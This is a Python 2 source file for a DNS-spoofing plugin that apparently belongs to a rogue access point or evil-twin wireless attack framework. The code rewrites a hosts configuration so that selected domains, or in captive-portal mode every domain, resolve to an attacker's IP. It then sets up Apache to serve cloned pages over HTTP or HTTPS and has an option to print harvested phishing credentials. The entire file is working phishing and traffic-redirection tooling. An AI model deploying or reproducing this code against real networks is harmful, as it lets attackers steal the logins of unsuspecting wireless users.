"""
This class is responsible for DNSSpoofing.

It is also capable of launching an http/https server with apache2
Can bew configured as captive portals but can also spoof multiple pages.
"""


import os
from AuxiliaryModules.httpserver import HTTPServer
from AuxiliaryModules.events import NeutralEvent
from SessionManager.sessionmanager import SessionManager
from plugin import AirHostPlugin
from utils.utils import FileHandler

class DNSSpoofer(AirHostPlugin):

    def __init__(self, config):
        super(DNSSpoofer, self).__init__(config, "dnsspoofer")
        self.spoof_ip = self.config["spoof_ip"]
        self.hosts_config_path = self.config["hosts_conf"]

        spoofpages = self.config["spoof_pages"]
        self.spoofpages = spoofpages if type(spoofpages) is list else [spoofpages]

        self.captive_portal_mode = False
        self.httpserver_running = False

        self.httpserver = self._configure_http_server()
        self.file_handler = None

    def _configure_http_server(self):
        httpserver = None
        if self.config["httpserver"].lower() == "true":
            apache_config_path = self.config["apache_conf"]
            apache_root_path = self.config["apache_root"]
            ssl = self.config["ssl_on"].lower() == "true"
            overwrite = self.config["overwrite_pages"].lower() == "true"
            httpserver = HTTPServer(apache_config_path, apache_root_path, ssl, overwrite)

            try:
                if self.config["print_phishing_creds"].lower() == "true":
                    httpserver.set_cred_file_keyword(self.config["creds_file_keyword"])
            except: pass

        return httpserver

    def set_captive_portal_mode(self, captive_portal_mode):
        self.captive_portal_mode = captive_portal_mode

    def set_http_server(self, server):
        self.httpserver = server

    def has_http_server(self):
        return self.httpserver is not None

    def add_page_to_spoof(self, page_name):
        for page in os.listdir("data/spoofpages/"):
            if page_name in page:
                self.spoofpages.append(page)
                print "[+] Added '{page}' to spoof list".format(page = page)
                SessionManager().log_event(NeutralEvent("Added '{page}' to spoof list".format(page = page)))
                return

        print "[-] Page '{}' not found in 'data/spoofpages/' folder."

    def _cleanup_misconfigured_pages(self):
        pages = []
        for page in self.spoofpages:
            for spoofpage in os.listdir("data/spoofpages/"):
                if page in spoofpage:
                    pages.append(spoofpage)
        self.spoofpages = pages

    def map_spoofing_pages(self, redirection_ip):
        if self.file_handler:
            self.file_handler.restore_file()

        self.file_handler = FileHandler(self.hosts_config_path)
        self._cleanup_misconfigured_pages()
        conf_string = ""
        if self.captive_portal_mode:
            page = self.spoofpages[0]
            conf_string += "{ip}\t{domain}\t{alias}\n".format(  ip = redirection_ip,
                                                                domain = page,
                                                                alias = "\t".join(self._create_alias_list(page)))
            conf_string += "{ip} *.*.*\n".format(ip = redirection_ip)
            print "[+] Mapped '{domain}' to {ip} as captive portal".format(domain = page, ip = redirection_ip)
        else:
            for page in self.spoofpages:
                conf_string += "{ip}\t{domain}\t{alias}\n".format(  ip = redirection_ip,
                                                                    domain = page,
                                                                    alias = "\t".join(self._create_alias_list(page)))
                print "[+] Mapped '{domain}' to {ip}".format(domain = page, ip = redirection_ip)
        self.file_handler.write(conf_string)

    def setup_spoofing_pages(self):
        if not self.has_http_server():
            print "[-] No HTTP Server added to DNSSpoofer, cannot setup spoofing"
            return False

        self._cleanup_misconfigured_pages()
        for page in self.spoofpages:
            self.httpserver.add_site(page)
            self.httpserver.configure_page_in_apache(   domain_name = page,
                                                        domain_alias = self._create_alias_list(page),
                                                        captive_portal_mode = self.captive_portal_mode)

    def _create_alias_list(self, domain):
        aliases = []
        splitted_domain = domain.split(".")
        if len(splitted_domain) >= 3:
            for i in range(len(splitted_domain) - 2):
                aliases.append(".".join(splitted_domain[i + 1:]))

        return aliases

    def start_spoofing(self, spoof_ip):
        if not self.has_http_server():
            print "[-] No HTTP Server added to DNSSpoofer, cannot spoof pages"
            return False

        self.httpserver.reset_conf()
        self.map_spoofing_pages(spoof_ip)
        self.setup_spoofing_pages()
        self.httpserver.start_server()
        SessionManager().log_event(NeutralEvent("Sarted local HTTP Server."))

    def stop_spoofing(self):
        if self.has_http_server():
            self.httpserver.reset_conf()
            self.httpserver.start_server(False)

    def pre_start(self):
        self.start_spoofing(self.spoof_ip)

    def restore(self):
        self.stop_spoofing()
        self.file_handler.restore_file()
